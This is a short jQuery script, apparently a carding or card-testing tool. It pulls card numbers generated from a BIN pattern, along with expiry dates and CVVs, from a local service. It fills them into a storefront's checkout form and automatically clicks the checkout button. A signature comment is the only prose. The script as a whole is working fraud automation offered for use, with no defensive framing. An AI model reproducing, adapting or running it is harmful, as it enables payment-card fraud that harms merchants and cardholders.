var jsonp_callback = function(arr) {
	var i = 0;
	var len = arr.length;
        var segundos = 5;

	var iteration = function() {
	  if( i < len ) {
	    var json = arr[0];
        var type;

        if( json.card[0] == "4")
           type = "VISA";
        else
           type = "MASTERCARD";

		$("#ctl00_PageContent_ctrlCreditCardPanel_ddlCCType").val(type);

	  	$("#ctl00_PageContent_ctrlCreditCardPanel_txtCCNumber").val(json.card);

		$("#ctl00_PageContent_ctrlCreditCardPanel_ddlCCExpMonth").val(json.mon);

		$("#ctl00_PageContent_ctrlCreditCardPanel_ddlCCExpYr").val("20"+json.year);

        $("#ctl00_PageContent_ctrlCreditCardPanel_txtCCVerCd").val(json.cvv);

        sessionStorage.card = JSON.stringify( json );

        console.log(json);

		$("#ctl00_PageContent_btnContCheckout").click();

	  }
	}

	iteration();
};
// Rasta Empire
$.ajax({
     url:"http://localhost:5000/bin?bin=4500030118xxxxxx&mon=05&year=18&cvv=254&can=1",
     dataType: "jsonp"
});